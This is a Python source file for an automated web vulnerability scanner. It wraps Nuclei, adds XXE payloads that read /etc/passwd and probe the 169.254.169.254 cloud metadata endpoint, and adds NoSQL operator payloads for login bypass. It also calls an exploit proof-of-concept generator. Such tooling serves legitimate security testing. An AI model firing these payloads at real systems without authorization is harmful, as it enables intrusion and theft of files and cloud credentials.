import json
import subprocess
import requests
import re
import time
import os
from typing import List, Dict, Any
from urllib.parse import urlparse
import concurrent.futures
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from tools.poc_generator import POCGenerator


class AdvancedFalsePositiveFilter:
    def __init__(self):
        self.major_domains = [
            'asana.com', 'google.com', 'microsoft.com', 'apple.com',
            'facebook.com', 'amazon.com', 'netflix.com', 'twitter.com',
            'github.com', 'stackoverflow.com'
        ]
        
        self.fp_patterns = [
            # Generic error messages that aren't vulnerabilities
            r"error occurred", r"page not found", r"404", r"internal server error",
            # Common false positive patterns
            r"sql.*syntax.*error", r"warning.*mysql", r"undefined.*index",
            r"file not found", r"invalid parameter", r"access denied",
            # Static content indicators
            r"<!DOCTYPE html>", r"<html", r"<script", r"text/html"
        ]
        
        self.xxe_fp_indicators = ['root', 'daemon', 'bin', 'system', 'entity']

    def is_false_positive(self, vulnerability: Dict[str, Any], response_content: str = "") -> bool:
        """Comprehensive false positive detection"""
        vuln_type = vulnerability.get('type', '').lower()
        url = vulnerability.get('url', '').lower()
        evidence = str(vulnerability.get('evidence', '')).lower()
        
        # Check basic patterns
        for pattern in self.fp_patterns:
            if (re.search(pattern, evidence) or 
                re.search(pattern, url)):
                return True
        
        # Type-specific false positive detection
        if vuln_type == 'xxe injection':
            return self._is_xxe_false_positive(vulnerability, response_content)
        elif vuln_type == 'nosql injection':
            return self._is_nosql_false_positive(vulnerability, response_content)
        elif vuln_type == 'idor':
            return self._is_idor_false_positive(vulnerability, response_content)
        elif 'sql injection' in vuln_type:
            return self._is_sqli_false_positive(vulnerability, response_content)
        
        # Major company domain filtering (be more strict)
        if any(domain in url for domain in self.major_domains):
            print(f"‚ö†Ô∏è  Finding on major company domain - extra scrutiny: {url}")
            # Government domains are exceptions for IDOR
            if '.gov.' in url or '.gv.' in url and 'idor' in vuln_type:
                return False
            return True
            
        return False

    def _is_xxe_false_positive(self, vulnerability: Dict[str, Any], response_content: str) -> bool:
        """XXE-specific false positive detection"""
        url = vulnerability.get('url', '')
        
        # If response is HTML, not XML processing
        if response_content and response_content.strip().startswith('<!DOCTYPE html'):
            return True
            
        # Check if evidence contains common web terms
        evidence = str(vulnerability.get('evidence', '')).lower()
        fp_terms = ['html', 'script', 'javascript', 'css', 'var ', 'function']
        if any(term in evidence for term in fp_terms):
            return True
            
        return False

    def _is_nosql_false_positive(self, vulnerability: Dict[str, Any], response_content: str) -> bool:
        """NoSQL injection false positive detection"""
        url = vulnerability.get('url', '')
        evidence = vulnerability.get('evidence', '')
        
        # Major companies are very unlikely to have NoSQL injection
        if any(domain in url for domain in self.major_domains):
            print(f"üö´ NoSQL on major company domain - almost certainly false positive: {url}")
            return True
            
        # If server returns HTML for JSON requests, likely false positive
        if response_content and 'text/html' in response_content.lower():
            return True
            
        # If evidence mentions static content, false positive
        if any(term in evidence.lower() for term in ['html', 'static', 'page not found']):
            return True
            
        return False

    def _is_idor_false_positive(self, vulnerability: Dict[str, Any], response_content: str) -> bool:
        """IDOR false positive detection"""
        evidence = vulnerability.get('evidence', '')
        
        # Skip if all responses are identical
        if 'same response' in evidence.lower() or 'identical' in evidence.lower():
            return True
            
        return False

    def _is_sqli_false_positive(self, vulnerability: Dict[str, Any], response_content: str) -> bool:
        """SQL injection false positive detection"""
        tool = vulnerability.get('tool', '')
        evidence = vulnerability.get('evidence', '')
        
        # Basic curl findings need verification
        if tool == 'curl' and 'sql error' not in evidence.lower():
            return True
            
        return False

class ConfidenceScorer:
    def calculate_confidence(self, vulnerability: Dict[str, Any]) -> float:
        """Enhanced confidence scoring"""
        base_score = 0.5
        
        # Tool-based confidence
        tool_scores = {
            'sqlmap': 0.9,
            'nuclei': 0.8,
            'curl': 0.3,
            'custom_xss_test': 0.7,
            'php_specific_test': 0.6,
            'auth_bypass_test': 0.5,
            'basic_security_test': 0.4,
            'business_logic_test': 0.7,
            'nosql_test': 0.4,
            'xxe_test': 0.4
        }
        
        tool = vulnerability.get('tool', '')
        base_score += tool_scores.get(tool, 0.3)
        
        # Evidence-based scoring
        evidence = str(vulnerability.get('evidence', '')).lower()
        if any(term in evidence for term in ['database', 'credentials', 'admin']):
            base_score += 0.3
        if 'sql' in evidence:
            base_score += 0.2
            
        # Severity-based scoring
        severity_scores = {
            'critical': 0.3,
            'high': 0.2,
            'medium': 0.1,
            'low': 0.0
        }
        severity = vulnerability.get('severity', 'medium').lower()
        base_score += severity_scores.get(severity, 0.1)
        
        # URL-based scoring (government domains are higher confidence)
        url = vulnerability.get('url', '')
        if '.gov.' in url or '.gv.' in url:
            base_score += 0.2
            
        return min(1.0, max(0.0, base_score))

class AccurateNucleiScanner:
    def __init__(self):
        self.template_dirs = [
            "/home/th0th/nuclei-templates/http/",
            "/home/th0th/nuclei-templates/http/exposures/",
            "/home/th0th/nuclei-templates/http/vulnerabilities/",
            "/home/th0th/nuclei-templates/http/technologies/"
        ]

    def get_valid_templates(self) -> List[str]:
        """Get only existing template directories"""
        valid_templates = []
        for template_dir in self.template_dirs:
            if os.path.exists(template_dir):
                valid_templates.extend(['-t', template_dir])
            else:
                print(f"‚ö†Ô∏è Nuclei template path not found: {template_dir}")
        return valid_templates

    def run_scan(self, target: str) -> List[Dict[str, Any]]:
        """Run nuclei scan with proper error handling and JSON parsing"""
        try:
            # SIMPLIFIED COMMAND - let Nuclei use default templates
            cmd = [
                'nuclei', '-u', target, '-json', '-silent',
                '-severity', 'low,medium,high,critical',  # Include low severity for testing
                '-rate-limit', '100',  # Increase rate limit
                '-timeout', '10',      # Reduce timeout since we're scanning faster
                '-retries', '3',
                '-disable-update-check'
            ]

            print(f"üîç Running Nuclei scan on {target}")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=180)  # Increase timeout
                
            # Handle empty output or errors
            if not result.stdout.strip():
                if result.stderr:
                    print(f"‚ö†Ô∏è Nuclei error: {result.stderr[:100]}...")
                return []
                
            # Parse JSON lines (nuclei outputs JSONL)
            findings = []
            valid_lines = 0
            for line in result.stdout.strip().split('\n'):
                if line.strip():
                    try:
                        finding = json.loads(line)
                        valid_lines += 1
                        # Convert nuclei finding to our format
                        vuln = {
                            'type': finding.get('template-id', 'Unknown'),
                            'url': finding.get('host', target),
                            'severity': finding.get('info', {}).get('severity', 'medium'),
                            'tool': 'nuclei',
                            'evidence': finding.get('matcher-name', ''),
                            'description': finding.get('info', {}).get('description', ''),
                            'confidence': 'medium'
                        }
                        findings.append(vuln)
                    except json.JSONDecodeError:
                        # Skip invalid JSON lines quietly
                        continue
            
            print(f"‚úÖ Nuclei parsed {valid_lines} valid findings from {target}")
            return findings
        
        except subprocess.TimeoutExpired:
            print(f"‚è∞ Nuclei scan timed out for {target}")
            return []
        except Exception as e:
            print(f"‚ùå Nuclei scan failed for {target}: {e}")
            return []

class AccurateXXEScanner:
    def __init__(self):
        self.xxe_payloads = [
            ('file_read', """<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>"""),
            
            ('ssrf', """<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<test>&xxe;</test>""")
        ]
    
    def test_xxe_vulnerability(self, url):
        """Accurate XXE testing with content-type validation"""
        print(f"üîç Testing XXE on: {url}")
        
        # First, get baseline response with better error handling
        try:
            baseline_response = requests.get(url, timeout=30, verify=False, allow_redirects=True)
            if baseline_response.status_code >= 400:
                print(f"‚úÖ Endpoint returned {baseline_response.status_code} - skipping")
                return None
        except requests.exceptions.ConnectionError:
            print("‚úÖ Cannot connect to endpoint - skipping")
            return None
        except requests.exceptions.Timeout:
            print("‚úÖ Endpoint timeout - skipping")
            return None
        except Exception as e:
            print(f"‚úÖ Endpoint error - skipping: {e}")
            return None
    
        
        for payload_name, payload in self.xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                response = requests.post(
                    url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=False
                )
                
                # CRITICAL: Check if server actually processed XML
                content_type = response.headers.get('content-type', '').lower()
                
                # If response is HTML, it's definitely not XXE
                if 'text/html' in content_type:
                    print(f"‚úÖ XXE false positive - server returned HTML, not XML")
                    continue
                    
                # If response length is same as normal request, likely false positive
                if len(response.text) == len(baseline_response.text):
                    print(f"‚úÖ XXE false positive - identical response length to normal page")
                    continue
                
                # Only now check for actual XXE indicators
                if self._is_real_xxe(response, payload_name):
                    return {
                        'type': 'XXE Injection',
                        'url': url,
                        'severity': 'critical',
                        'tool': 'xxe_scanner',
                        'evidence': f'XXE confirmed with {payload_name} payload',
                        'confidence': 'high',
                        'poc': payload
                    }
                    
            except Exception as e:
                print(f"‚ùå XXE test failed: {e}")
        
        return None
    
    def _is_real_xxe(self, response, payload_name):
        """ACCURATE XXE detection - no false positives"""
        content = response.text
        
        if payload_name == 'file_read':
            # Check for ACTUAL /etc/passwd format with proper structure
            etc_passwd_pattern = r'^[a-z-]+:x:\d+:\d+:[^:]*:[^:]*:[^:]*$'
            lines = content.split('\n')
            passwd_lines_found = 0
            
            for line in lines:
                if re.match(etc_passwd_pattern, line.strip()):
                    passwd_lines_found += 1
                    
            # Need multiple valid /etc/passwd lines to confirm
            return passwd_lines_found >= 3
            
        elif payload_name == 'ssrf':
            # Check for actual AWS metadata structure
            aws_indicators = ['instance-id', 'ami-', 'availability-zone']
            return any(indicator in content for indicator in aws_indicators)
            
        return False

class AccurateNoSQLScanner:
    def __init__(self):
        self.nosql_payloads = [
            {'username': {'$ne': 'invalid'}},
            {'$or': [{'username': 'admin'}, {'username': 'test'}]},
            {'username': {'$regex': '.*'}},
        ]
    
    def test_nosql_injection(self, url):
        """Accurate NoSQL injection testing"""
        print(f"üîç Testing NoSQL injection: {url}")
        
        # First, check if endpoint exists and accepts data
        try:
            baseline_response = requests.get(url, timeout=30, verify=False)
            if baseline_response.status_code == 404:
                print("‚úÖ Endpoint not found - false positive")
                return None
        except:
            print("‚úÖ Cannot reach endpoint - false positive")
            return None
        
        for payload in self.nosql_payloads:
            try:
                # Test with JSON
                headers = {'Content-Type': 'application/json'}
                response = requests.post(
                    url,
                    json=payload,
                    headers=headers,
                    timeout=30,
                    verify=False,
                    allow_redirects=False
                )
                
                # CRITICAL CHECKS FOR FALSE POSITIVES:
                
                # 1. Check if response is different from baseline
                baseline_len = len(baseline_response.text)
                response_len = len(response.text)
                
                # If identical to baseline, likely false positive
                if response_len == baseline_len and response.status_code == 200:
                    print(f"‚úÖ Identical to baseline - likely false positive")
                    continue
                
                # 2. Check if server actually processes JSON
                content_type = response.headers.get('content-type', '').lower()
                if 'text/html' in content_type and response_len == baseline_len:
                    print(f"‚úÖ Server returning HTML, not processing JSON - false positive")
                    continue
                
                # 3. Look for actual NoSQL indicators
                if self._is_real_nosql(response, baseline_response):
                    return {
                        'type': 'NoSQL Injection',
                        'url': url,
                        'severity': 'high',
                        'tool': 'nosql_scanner',
                        'evidence': f'NoSQL injection confirmed with payload: {payload}',
                        'confidence': 'high',
                        'poc': json.dumps(payload)
                    }
                    
            except Exception as e:
                print(f"‚ùå NoSQL test failed: {e}")
        
        return None
    
    def _is_real_nosql(self, response, baseline):
        """Determine if this is a real NoSQL injection"""
        content = response.text.lower()
        baseline_content = baseline.text.lower()
        
        # Real NoSQL injection indicators
        real_indicators = [
            # Authentication bypass
            'welcome', 'dashboard', 'admin panel', 'logged in as',
            # Database errors
            'mongodb', 'nosql', 'unexpected operator', 'database error',
            # Different content structure
        ]
        
        # Check for significant content differences
        if len(response.text) != len(baseline.text):
            # Count real indicators
            indicator_count = sum(1 for ind in real_indicators if ind in content)
            return indicator_count >= 2
            
        return False

class VulnerabilityScanner:
    def __init__(self, max_workers: int = 10):
        self.max_workers = max_workers
        self.fp_filter = AdvancedFalsePositiveFilter()
        self.scorer = ConfidenceScorer()
        self.nuclei_scanner = AccurateNucleiScanner()
        self.xxe_scanner = AccurateXXEScanner()
        self.nosql_scanner = AccurateNoSQLScanner()

    def scan_single_target(self, target: str) -> Dict[str, Any]:
            """Scan a single target and return results in the expected JSON format"""
            print(f"üéØ Scanning single target: {target}")
            
            # Run the scan
            report = self.scan_targets_with_verification([target])
            
            # Convert to the expected JSON structure
            return {
                "target": target,
                "vulnerabilities": report['verified_vulnerabilities'],
                "scan_summary": report['summary'],
                "timestamp": time.time()
            }


    def scan_targets_with_verification(self, targets: List[str]) -> Dict[str, Any]:
        """Comprehensive vulnerability scanning with enhanced verification"""
        all_findings = []
        
        print(f"üîç Starting enhanced vulnerability scan on {len(targets)} targets")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Run nuclei scans in parallel
            nuclei_futures = [executor.submit(self.nuclei_scanner.run_scan, target) for target in targets]
            
            for future in concurrent.futures.as_completed(nuclei_futures):
                try:
                    findings = future.result()
                    all_findings.extend(findings)
                except Exception as e:
                    print(f"‚ùå Error in nuclei scan: {e}")
        
        # Run specialized scanners for high-risk targets
        print(f"üß™ Running specialized vulnerability scanners...")
        for target in targets[:5]:  # Limit to first 5 targets to avoid over-scanning
            # XXE testing
            xxe_result = self.xxe_scanner.test_xxe_vulnerability(target)
            if xxe_result:
                all_findings.append(xxe_result)
            
            # NoSQL testing
            nosql_result = self.nosql_scanner.test_nosql_injection(target)
            if nosql_result:
                all_findings.append(nosql_result)
        
        # Filter and score vulnerabilities
        verified_vulns = self.filter_and_score_vulnerabilities(all_findings)
        
        # ‚úÖ ADD THIS: Enhance findings with AI-generated exploit POCs
        print("ü§ñ Generating AI-powered exploit POCs...")
        enhanced_vulns = self.enhance_findings_with_pocs(verified_vulns)
        
        # Generate detailed report
        report = {
            'verified_vulnerabilities': enhanced_vulns,  # Use enhanced vulns
            'raw_findings': all_findings,
            'summary': self._generate_summary(all_findings, enhanced_vulns)
        }
        
        return report

    def filter_and_score_vulnerabilities(self, vulnerabilities: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Apply false positive filtering and confidence scoring"""
        filtered_vulns = []
        fp_count = 0
        
        print(f"üéØ Filtering {len(vulnerabilities)} raw findings...")
        
        for vuln in vulnerabilities:
            # Skip false positives
            if self.fp_filter.is_false_positive(vuln):
                fp_count += 1
                print(f"üö´ Filtered FP: {vuln.get('type')} - {vuln.get('url')}")
                continue
                
            # Calculate confidence score
            confidence = self.scorer.calculate_confidence(vuln)
            vuln['confidence_score'] = round(confidence, 2)
            
            # Only include vulnerabilities with sufficient confidence
            if confidence >= 0.6:
                filtered_vulns.append(vuln)
            else:
                fp_count += 1
                print(f"‚ö†Ô∏è Low confidence filtered: {vuln.get('type')} - {vuln.get('url')} - Score: {confidence:.2f}")
        
        print(f"üìä Filtering complete: {len(filtered_vulns)} verified, {fp_count} filtered")
        return filtered_vulns

    def _generate_summary(self, raw_findings: List[Dict[str, Any]], verified_vulns: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Generate comprehensive scan summary"""
        severity_count = {'critical': 0, 'high': 0, 'medium': 0, 'low': 0}
        for vuln in verified_vulns:
            severity = vuln.get('severity', 'medium').lower()
            severity_count[severity] = severity_count.get(severity, 0) + 1
        
        return {
            'total_raw_findings': len(raw_findings),
            'verified_count': len(verified_vulns),
            'false_positives_removed': len(raw_findings) - len(verified_vulns),
            'verification_rate': len(verified_vulns) / len(raw_findings) if raw_findings else 0,
            'severity_breakdown': severity_count,
            'high_confidence_vulns': len([v for v in verified_vulns if v.get('confidence_score', 0) >= 0.8])
        }

    def get_scan_statistics(self) -> Dict[str, Any]:
        """Get scanner statistics and configuration"""
        return {
            'max_workers': self.max_workers,
            'false_positive_filter': 'AdvancedFalsePositiveFilter',
            'confidence_scorer': 'EnhancedConfidenceScorer',
            'specialized_scanners': ['Nuclei', 'XXE', 'NoSQL']
        }
        
    def enhance_findings_with_pocs(self, findings: List[Dict]) -> List[Dict]:
        """Add actual exploit POCs to vulnerability findings"""
        print("üéØ Generating exploit POCs for verified findings...")
        
        try:
            # Import here to avoid circular imports
            from tools.poc_generator import POCGenerator
        except ImportError:
            print("‚ùå POCGenerator not found, skipping POC generation")
            return findings
        
        poc_generator = POCGenerator()
        enhanced_findings = []
        
        for finding in findings:
            # Only generate POCs for medium/high confidence findings
            confidence = finding.get('confidence', 'low').lower()
            severity = finding.get('severity', 'low').lower()
            
            if confidence in ['high', 'medium'] and severity in ['high', 'critical', 'medium']:
                try:
                    poc_data = poc_generator.generate_exploit_poc(finding)
                    enhanced_finding = {
                        **finding,
                        'exploit_poc': poc_data,
                        'verified': poc_data.get('verified', False)
                    }
                    enhanced_findings.append(enhanced_finding)
                    print(f"‚úÖ Generated POC for: {finding.get('type')}")
                except Exception as e:
                    print(f"‚ùå POC generation failed for {finding.get('type')}: {e}")
                    enhanced_findings.append(finding)
            else:
                enhanced_findings.append(finding)
        
        verified_count = len([v for v in enhanced_findings if v.get('verified')])
        print(f"üìä POC generation complete: {verified_count} verified exploits")
        
        return enhanced_findings